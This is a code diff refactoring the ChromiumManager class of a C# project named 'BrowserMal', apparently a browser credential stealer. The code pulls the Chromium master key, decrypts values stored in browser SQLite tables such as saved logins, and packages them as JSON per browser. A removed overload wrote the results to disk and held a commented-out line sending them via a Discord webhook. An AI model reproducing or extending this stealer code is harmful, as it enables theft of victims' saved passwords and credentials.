@@ -10,20 +10,13 @@ using BrowserMal.Encryption;
 
 namespace BrowserMal.Manager
 {
-    public class ChromiumManager<T>
+    public class ChromiumManager<T> : Manager<T>
     {
-        private readonly string tableName;
-        private readonly SqliteTableModel sqliteTableModel;
-        private readonly Dictionary<string, string> resultList;
-
-        public ChromiumManager(string tableName, SqliteTableModel sqliteTableModel)
+        public ChromiumManager(string tableName, SqliteTableModel sqliteTableModel) : base(tableName, sqliteTableModel)
         {
-            this.tableName = tableName;
-            this.sqliteTableModel = sqliteTableModel;
-            resultList = new Dictionary<string, string>();
         }
 
-        public Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType)
+        public override Dictionary<string, string> Init(ref List<BrowserModel> browsers, string profileType)
         {
             try
             {
@@ -44,42 +37,14 @@ namespace BrowserMal.Manager
                     if (result.Count == 0)
                         continue;
 
-                    resultList.Add($"{browser.Name}_{tableName}.json", JsonUtil.GetJson<T>(result));
+                    _resultList.Add($"{browser.Name}_{GetTableName}.json", JsonUtil.GetJson<T>(result));
                 }
 
-                return resultList;
+                return _resultList;
             }
             catch { }
 
             return new Dictionary<string, string>();
-        }
-
-        public void Init(ref List<BrowserModel> browsers, string profileType, string outputPath)
-        {
-            try
-            {
-                foreach (BrowserModel browser in browsers)
-                {
-                    if (!Directory.Exists(browser.Location))
-                        continue;
-
-                    byte[] key = ChromiumDecryption.GetMasterKey(browser.Location);
-
-                    if (key == null)
-                        continue;
-
-                    browser.MasterKey = key;
-
-                    List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);
-
-                    if (result.Count == 0)
-                        continue;
-
-                    //Discord.Webhook.SendFile<T>(result, $"{browser.Name}_{tableName}.json");
-                    FileManager.Save<T>(result, outputPath, $"{browser.Name}_{tableName}.json");
-                }
-            }
-            catch { }
         }
 
         private List<T> GetLogins(string path, byte[] masterKey, string profileType)
@@ -98,20 +63,18 @@ namespace BrowserMal.Manager
             return creds;
         }
 
-        private T CreateInstanceOfType(object[] args) => (T)Activator.CreateInstance(typeof(T), args);
-
         private List<T> GetProfileLogins(string path, byte[] masterKey)
         {
             List<T> generic = new List<T>();
 
             SqliteHandler sqLiteHandler = new SqliteHandler(path);
-            sqLiteHandler.ReadTable(tableName);
+            sqLiteHandler.ReadTable(GetTableName);
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
             {
                 try
                 {
-                    string[] values = GrabAndValidateSqliteValues(sqliteTableModel.GetColumns(), ref sqLiteHandler, i, masterKey, out bool ignore);
+                    string[] values = GrabAndValidateSqliteValues(_sqliteTableModel.GetColumns(), ref sqLiteHandler, i, masterKey, out bool ignore);
                     if (ignore)
                         continue;
 
@@ -159,5 +122,7 @@ namespace BrowserMal.Manager
         {
             return (isEncrypted) ? ChromiumDecryption.GetEncryptedValue(outputValue, masterKey) : outputValue;
         }
+
+        
     }
 }
